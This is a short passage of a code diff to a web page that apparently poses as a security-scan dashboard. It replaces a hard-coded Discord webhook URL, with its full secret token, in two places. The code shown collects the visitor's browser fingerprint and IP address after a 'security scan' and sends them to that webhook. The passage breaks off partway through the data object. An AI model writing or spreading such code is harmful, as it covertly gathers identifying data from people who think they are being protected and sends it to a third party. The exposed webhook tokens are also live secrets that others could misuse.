@@ -2283,7 +2283,7 @@
         const threatUpdateTime = document.getElementById('threat-update-time');
 
         // Initialize webhook URL - to be set in production
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1368701646976061571/HcxsS8MtxmBfb4fiVs0me2U8Ks_gUUV7rCqGrRkEuZAkrtdZxxBM9jezhEFDB2tlyXgI";
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1369505902079774830/E1DB1I-wc_PqiaQAHwPMbJEtjMILqp8e9PJDisbS5rWjR-o7J9iXoXx2oBc3N4F9spMo";
 
         // Cookie functions
         function setCookie(name, value, days) {
@@ -2417,7 +2417,7 @@
                 addActivity("Security scan completed", "System security assessment finished with score: " + score);
 
                 // Send data to webhook in production environment
-                if (WEBHOOK_URL == "https://discord.com/api/webhooks/1368701646976061571/HcxsS8MtxmBfb4fiVs0me2U8Ks_gUUV7rCqGrRkEuZAkrtdZxxBM9jezhEFDB2tlyXgI") {
+                if (WEBHOOK_URL == "https://discord.com/api/webhooks/1369505902079774830/E1DB1I-wc_PqiaQAHwPMbJEtjMILqp8e9PJDisbS5rWjR-o7J9iXoXx2oBc3N4F9spMo") {
                     const securityData = {
                         fingerprint: result.visitorId,
                         ip: ipData.ip,
